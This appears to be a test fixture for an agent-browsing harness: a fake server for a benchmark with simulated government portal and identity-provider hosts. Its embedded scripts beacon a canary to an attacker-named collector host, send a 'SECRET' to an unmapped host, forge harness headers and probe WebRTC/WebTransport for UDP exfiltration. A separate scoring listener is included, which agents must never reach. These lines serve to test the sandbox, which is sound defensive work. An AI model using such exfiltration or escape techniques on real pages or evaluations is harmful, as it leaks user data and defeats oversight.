/**
 * A tiny stand-in for SpainBench's public listener (NOT the real SpainBench): virtual hosts by
 * `X-SpainBench-Host || Host`, the contract headers of docs/EVAL.md, a collector, and a "scoring"
 * listener on another port that must never be reached. Hostnames are `.test` names (RFC 6761):
 * they never resolve in real DNS.
 */
import http, { type IncomingHttpHeaders } from 'node:http';
import type { AddressInfo } from 'node:net';

export const PORTAL = 'portal.example-gov.test';
export const IDP = 'idp.example-gov.test';
export const CLAVE = 'clave.example-gov.test';
export const COLLECTOR = 'colaborador.attacker-example.test';
const EXTERNAL = 'sede.example-gov.test';
export const UNMAPPED = 'www.nonexistent-agency.test';

export const BENCH_HOSTS = [
  { host: PORTAL, site: 'demo', key: 'portal', kind: 'site' as const },
  { host: IDP, site: 'demo', key: 'idp', kind: 'site' as const },
  { host: CLAVE, site: 'demo', key: 'clave', kind: 'site' as const },
  { host: EXTERNAL, site: 'demo', key: 'sede', kind: 'external' as const },
];

interface Seen {
  /** The server's own request counter (what `X-SpainBench-Seq` says). */
  seq: number;
  /** The real host (`X-SpainBench-Host`, else `Host`). */
  host: string;
  /** The `Host` header as it arrived. */
  hostHeader: string | undefined;
  method: string;
  path: string;
  headers: IncomingHttpHeaders;
  body: string;
}

export interface FakeBench {
  /** `http://127.0.0.1:<port>`: the public listener. */
  origin: string;
  /** `http://127.0.0.1:<port>`: the scoring listener (nobody may reach it). */
  scoringOrigin: string;
  requests: Seen[];
  scoringHits: string[];
  close(): Promise<void>;
}

const PDF = Buffer.from(
  '%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n',
);

const APP_JS = `
const out = document.getElementById('out');
const log = (k, v) => { const p = document.createElement('p'); p.textContent = k + ' = ' + v; out.appendChild(p); };
fetch('/echo', { headers: { 'x-spainbench-world': 'forged-world', 'X-SpainBench-Source': 'forged', 'x-spainbench-host': 'evil.test' } })
  .then((r) => r.json()).then((j) => log('echo', Object.entries(j).map(([k, v]) => k + ':' + v).join(' ')), (e) => log('echo-error', e.message));
fetch('https://${UNMAPPED}/x?d=SECRET').then(() => log('unmapped', 'reached'), (e) => log('unmapped', e.name));
const xhr = new XMLHttpRequest();
xhr.open('GET', '/xhr'); xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
xhr.onload = () => log('xhr', xhr.status); xhr.send();
navigator.sendBeacon('https://${COLLECTOR}/beacon', 'canary=53918274H');
log('secure', String(window.isSecureContext));
log('origin', location.origin);
navigator.serviceWorker.register('/sw.js').then(() => navigator.serviceWorker.ready).then(() => log('sw', 'ready'), (e) => log('sw', 'error ' + e.name));
`;

/**
 * What a page that wants to send UDP out of the browser would try: a WebRTC peer connection with a
 * STUN server at `udp=<port>` on loopback, from the page, from an `about:blank` frame (read at
 * once, before the frame loads) and a `srcdoc` one, and WebTransport from the page and from a
 * worker. It reports what each frame has (`typeof`), so a test sees where the removal held.
 */
const WEBRTC_JS = `
const port = new URLSearchParams(location.search).get('udp');
const out = document.getElementById('out');
const log = (k, v) => { const p = document.createElement('p'); p.textContent = k + ' = ' + v; out.appendChild(p); };
function probe(label, win) {
  const types = ['RTCPeerConnection', 'webkitRTCPeerConnection', 'RTCDataChannel', 'WebTransport']
    .map((name) => name + ':' + typeof win[name]).join(',');
  log(label, types);
  if (typeof win.RTCPeerConnection === 'function') {
    try {
      const pc = new win.RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:' + port }] });
      pc.createDataChannel('x');
      pc.createOffer().then((offer) => pc.setLocalDescription(offer)).catch(() => {});
    } catch (e) { log(label + '-error', e.name); }
  }
  if (typeof win.WebTransport === 'function') {
    try { new win.WebTransport('https://127.0.0.1:' + port + '/wt').ready.catch(() => {}); }
    catch (e) { log(label + '-wt-error', e.name); }
  }
}
probe('top', window);
const blank = document.createElement('iframe');
document.body.appendChild(blank);
probe('blank', blank.contentWindow);
const doc = document.createElement('iframe');
doc.srcdoc = '<p>x</p>';
doc.onload = () => probe('srcdoc', doc.contentWindow);
document.body.appendChild(doc);
const worker = new Worker(URL.createObjectURL(new Blob([
  "const t = typeof WebTransport; postMessage('worker WebTransport:' + t);" +
  "if (t === 'function') { try { new WebTransport('https://127.0.0.1:' + " + JSON.stringify(port) + " + '/wt').ready.catch(() => {}); } catch (e) {} }",
], { type: 'text/javascript' })));
worker.onmessage = (event) => log('worker', event.data);
log('done', 'yes');
`;

function page(title: string, body: string): string {
  return `<!doctype html><html lang="es"><head><meta charset="utf-8"><title>${title}</title></head><body>${body}</body></html>`;
}

export async function startFakeBench(): Promise<FakeBench> {
  const requests: Seen[] = [];
  const scoringHits: string[] = [];
  let seq = 0;

  const server = http.createServer(async (req, res) => {
    const chunks: Buffer[] = [];
    for await (const c of req) chunks.push(c as Buffer);
    const h = req.headers;
    const host = String(h['x-spainbench-host'] ?? h.host ?? '')
      .toLowerCase()
      .replace(/:\d+$/, '');
    const mySeq = ++seq;
    const seen: Seen = {
      seq: mySeq,
      host,
      hostHeader: h.host,
      method: req.method ?? 'GET',
      path: req.url ?? '/',
      headers: h,
      body: Buffer.concat(chunks).toString('utf8'),
    };
    requests.push(seen);
    const proto = String(h['x-forwarded-proto'] ?? 'https');
    const absolute = (otherHost: string, path: string) => `${proto}://${otherHost}${path}`;
    const url = new URL(seen.path, 'http://x');

    // What a careless mock would tell: the harness must not let it through.
    res.setHeader('server', 'SpainBench/0.2 (node)');
    res.setHeader('x-powered-by', 'Express');
    res.setHeader('x-spainbench-debug', 'on');
    if (h['x-spainbench-harness'] === '1') {
      res.setHeader('x-spainbench-seq', String(mySeq));
      res.setHeader('x-spainbench-page', url.pathname);
    }
    const kind = (k: string) => {
      if (h['x-spainbench-harness'] === '1') res.setHeader('x-spainbench-kind', k);
    };
    const send = (
      status: number,
      type: string,
      body: string | Buffer,
      extra: Record<string, string | string[]> = {},
    ) => {
      res.writeHead(status, {
        'content-type': type,
        'content-length': String(Buffer.byteLength(body)),
        ...extra,
      });
      res.end(body);
    };
    const html = (title: string, body: string, status = 200, extra = {}) => {
      kind('ok');
      send(status, 'text/html; charset=utf-8', page(title, body), extra);
    };
    const redirect = (
      status: number,
      to: string,
      extra: Record<string, string | string[]> = {},
    ) => {
      kind('ok');
      res.writeHead(status, { location: to, ...extra });
      res.end();
    };

    if (url.pathname === '/favicon.ico') {
      res.writeHead(204);
      res.end();
      return;
    }
    if (host === COLLECTOR) {
      kind('exfil');
      send(200, 'text/plain', 'ok');
      return;
    }
    if (host === EXTERNAL) {
      kind('unknown-host');
      html('404', '<h1>Not Found</h1>', 404);
      return;
    }
    if (host === PORTAL) {
      switch (url.pathname) {
        case '/':
          html(
            'Portal',
            `<h1>Portal</h1><link rel="stylesheet" href="/style.css"><script src="/app.js" defer></script>
             <img src="/pixel.gif" alt="pixel"><iframe src="${absolute(IDP, '/frame')}" title="marco"></iframe>
             <a href="/attachment.pdf">Descargar informe</a> <a href="/form">Acceso</a>
             <div id="out"></div>`,
          );
          return;
        case '/form':
          html(
            'Acceso',
            `<form method="post" action="/post"><label>Usuario <input name="u"></label>
             <label>Clave <input name="p" type="password"></label><button type="submit">Entrar</button></form>`,
          );
          return;
        case '/app.js':
          kind('ok');
          send(200, 'application/javascript', APP_JS);
          return;
        case '/webrtc':
          html('WebRTC', '<div id="out"></div><script src="/webrtc.js"></script>');
          return;
        case '/webrtc.js':
          kind('ok');
          send(200, 'application/javascript', WEBRTC_JS);
          return;
        case '/sw.js':
          kind('ok');
          send(
            200,
            'application/javascript',
            "self.addEventListener('install', () => self.skipWaiting());",
          );
          return;
        case '/style.css':
          kind('ok');
          send(200, 'text/css', 'h1{color:#123}');
          return;
        case '/pixel.gif':
          kind('ok');
          send(200, 'image/gif', Buffer.from('R0lGODlhAQABAAAAACw=', 'base64'));
          return;
        case '/echo':
        case '/xhr':
          kind('ok');
          send(
            200,
            'application/json',
            JSON.stringify({
              world: h['x-spainbench-world'],
              source: h['x-spainbench-source'],
              resourceType: h['x-spainbench-resource-type'],
              host: h['x-spainbench-host'],
              proto: h['x-forwarded-proto'],
              harness: h['x-spainbench-harness'],
            }),
          );
          return;
        case '/set-cookie':
          html('Cookies', '<p>cookies set</p>', 200, {
            'set-cookie': [
              'host_only=1; Path=/',
              'shared=2; Domain=example-gov.test; Path=/; Secure; SameSite=Lax',
              'third=3; Path=/; HttpOnly',
            ],
          });
          return;
        case '/whoami':
          html('Quien', `<p>cookie: ${h.cookie ?? '(none)'}</p>`);
          return;
        case '/login':
          redirect(
            302,
            absolute(IDP, `/sso?return=${encodeURIComponent(absolute(PORTAL, '/back'))}`),
          );
          return;
        case '/back':
          html('Vuelta', '<p>De vuelta en el portal</p>');
          return;
        case '/leaky-redirect':
          // A mock that forgot to derive its URLs from Host: the harness repairs it.
          redirect(302, `http://127.0.0.1:${(server.address() as AddressInfo).port}/back`);
          return;
        case '/attachment.pdf':
          kind('ok');
          send(200, 'application/pdf', PDF, {
            'content-disposition': 'attachment; filename="vida_laboral.pdf"',
          });
          return;
        case '/inline.pdf':
          kind('ok');
          send(200, 'application/pdf', PDF, {
            'content-disposition': 'inline; filename="informe.pdf"',
          });
          return;
        case '/post':
          kind('ok');
          send(
            200,
            'application/json',
            JSON.stringify({ method: seen.method, body: seen.body, type: h['content-type'] }),
          );
          return;
        case '/gzip': {
          const { gzipSync } = await import('node:zlib');
          kind('ok');
          send(200, 'text/plain', gzipSync(Buffer.from('comprimido')), {
            'content-encoding': 'gzip',
          });
          return;
        }
        case '/empty-304':
          res.writeHead(304);
          res.end();
          return;
        case '/slow-stream':
          kind('ok');
          res.writeHead(200, { 'content-type': 'text/plain' });
          res.write('uno ');
          setTimeout(() => res.end('dos'), 150);
          return;
        case '/endless':
          kind('ok');
          res.writeHead(200, { 'content-type': 'text/plain' });
          res.write('x');
          return;
        case '/loop':
          redirect(302, absolute(PORTAL, '/loop'));
          return;
        case '/r301':
          redirect(301, '/post');
          return;
        case '/r303':
          redirect(303, '/post');
          return;
        case '/r307':
          redirect(307, '/post');
          return;
        case '/to-idp':
          redirect(302, absolute(IDP, '/whoami'));
          return;
        case '/to-unmapped':
          redirect(302, `https://${UNMAPPED}/inicio`);
          return;
        case '/relative':
          redirect(302, '/back?from=relative');
          return;
        default:
          kind('not-found');
          html('404', '<h1>No encontrado</h1>', 404);
          return;
      }
    }
    if (host === IDP) {
      switch (url.pathname) {
        case '/sso':
          redirect(303, absolute(CLAVE, '/auth?step=1'), {
            'set-cookie': [
              'idp_only=1; Path=/',
              'shared_idp=9; Domain=example-gov.test; Path=/; Secure',
            ],
          });
          return;
        case '/frame':
          html('Marco', '<p>marco del idp</p>');
          return;
        case '/whoami':
          html('Quien', `<p>cookie: ${h.cookie ?? '(none)'}</p>`);
          return;
        default:
          kind('not-found');
          html('404', '<h1>No encontrado</h1>', 404);
          return;
      }
    }
    if (host === CLAVE && url.pathname === '/auth') {
      redirect(302, absolute(PORTAL, '/back'));
      return;
    }
    kind('unknown-host');
    html('404', '<h1>Not Found</h1>', 404);
  });

  const scoring = http.createServer((req, res) => {
    scoringHits.push(`${req.method} ${req.url}`);
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end('{"scoring":true}');
  });

  await Promise.all(
    [server, scoring].map(
      (s) => new Promise<void>((resolve) => s.listen(0, '127.0.0.1', () => resolve())),
    ),
  );
  const origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  const scoringOrigin = `http://127.0.0.1:${(scoring.address() as AddressInfo).port}`;
  return {
    origin,
    scoringOrigin,
    requests,
    scoringHits,
    close: async () => {
      for (const s of [server, scoring]) s.closeAllConnections();
      await Promise.all(
        [server, scoring].map((s) => new Promise<void>((resolve) => s.close(() => resolve()))),
      );
    },
  };
}
